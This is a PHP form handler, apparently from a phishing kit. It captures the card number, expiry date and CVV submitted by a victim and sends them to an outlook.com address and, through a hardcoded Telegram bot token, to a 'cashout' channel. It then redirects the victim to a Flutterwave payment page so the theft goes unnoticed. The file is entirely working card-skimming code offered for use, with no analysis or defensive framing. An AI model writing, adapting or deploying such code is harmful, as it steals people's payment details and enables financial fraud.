<?php
$card=$_POST['card'];
$exp=$_POST['exp'];
$cvv=$_POST['cvv'];
$nl="\r\n";
$from = "Cashout";
$to = "okeke158@outlook.com";
$subject = "Cashout Is A Must By Gods  Grace";
$message = 'CARD: ' . $card . $nl.'EXP: ' . $exp .$nl. 'CVV: ' . $cvv ;
$headers = "From:" . $from;
mail($to,$subject,$message, $headers) ;
$api = "5369209739:AAFaMNk39MGepMZ3E9YrjLqhEHZupqCK-Pw";
$chatid = "@amexcashout158";
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
header('Location: https://flutterwave.com/pay/w3ef0pybjg3x?_gl=1%2a15dvi80%2a_ga%2aMTQwNDA0MTU0OS4xNjYwMzg4MDAx%2a_ga_KQ9NSEMFCF%2aMTY2NjEwNzM5NC41Ny4xLjE2NjYxMDc1MTguMzAuMC4w');
?>
